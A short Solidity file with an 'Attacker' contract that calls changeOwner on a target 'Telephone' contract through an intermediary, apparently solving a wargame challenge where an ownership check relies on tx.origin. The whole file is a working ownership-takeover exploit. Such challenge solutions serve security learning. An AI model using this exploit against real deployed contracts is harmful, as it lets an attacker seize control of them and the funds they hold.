// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Telephone {
    function changeOwner(address _owner) public virtual;
}

contract Attacker {
    constructor() {}

    function attack(address target) external payable {
        Telephone(target).changeOwner(msg.sender);
    }

    receive() external payable {}

    fallback() external payable {}
}
